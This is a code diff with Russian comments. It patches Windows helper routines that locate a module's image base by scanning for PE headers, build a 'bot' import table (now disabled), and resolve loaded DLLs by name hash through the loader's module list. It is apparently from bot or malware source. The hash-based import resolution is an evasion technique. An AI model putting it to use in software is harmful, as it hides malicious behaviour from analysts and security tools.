@@ -31,10 +31,10 @@ HMODULE KernelModuleAddr = NULL;
 //  Пример:
 //		DWORD Base = GetImageBase(&MyFunction);
 //--------------------------------------------------
-DWORD WINAPI GetImageBase( LPVOID procAddr )
+LPVOID WINAPI GetImageBase( LPVOID procAddr )
 {
-	DWORD addr = (procAddr) ? (DWORD)procAddr : (DWORD)&GetImageBase;
-	addr &= 0xffff0000;
+	LPBYTE addr = (procAddr) ? (LPBYTE)procAddr : (LPBYTE)&GetImageBase;
+	addr = (LPBYTE)((size_t)addr & 0xFFFFFFFFFFFF0000); // Маска с расчётом на X86 и X64
 	for(;;)
 	{
 		PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)addr;
@@ -47,7 +47,7 @@ DWORD WINAPI GetImageBase( LPVOID procAddr )
 					break;
 			}
 		}
-		addr -= 0x10000;
+		addr -= 0x1000;
 	}
 	return addr;
 }
@@ -55,6 +55,8 @@ DWORD WINAPI GetImageBase( LPVOID procAddr )
 
 static bool BuildBotImportTable()
 {
+	return false;
+
 	unsigned char* imageBase = (unsigned char*)GetImageBase();
 	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
 	PIMAGE_NT_HEADERS header = (PIMAGE_NT_HEADERS)&((const unsigned char *)(imageBase))[dosHeader->e_lfanew];
@@ -143,14 +145,10 @@ BOOL InitializeAPI()
 	// Инициализируем глобальный кэш
 	if (ApiCacheSize > 0)
 	{
-		GlobalApiCache = (LPVOID*)pVirtualAlloc(0, (ApiCacheSize + 1)*sizeof(LPVOID), 
-												MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
-		for (int i = 0; i <= ApiCacheSize; i++) GlobalApiCache[i] = 0;
-
-			//(LPVOID*)MemAlloc((ApiCacheSize + 1)*sizeof(LPVOID));
-		//m_memset(GlobalApiCache, 0, (ApiCacheSize + 1)*sizeof(LPVOID));
+		DWORD BufSize = (ApiCacheSize + 1)*sizeof(LPVOID);
+		GlobalApiCache = (LPVOID*)MemAlloc(BufSize);
+		m_memset(GlobalApiCache, 0, BufSize);
 	}
-
 
 	BuildBotImportTable();
 	return true;
@@ -221,7 +219,7 @@ HMODULE GetDllBase(DWORD DllHash)
     {
 		PLDR_DATA_TABLE_ENTRY LdrData = CONTAINING_RECORD( Entry, LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList );    
 
-		DWORD Hash = STRW::Hash(LdrData->BaseDllName.Buffer, LdrData->BaseDllName.Length, false);
+		DWORD Hash = STRW::Hash(LdrData->BaseDllName.Buffer, LdrData->BaseDllName.Length, true);
 		if (Hash == DllHash)
 			return (HMODULE)LdrData->DllBase;
 		Entry = Entry->Flink;
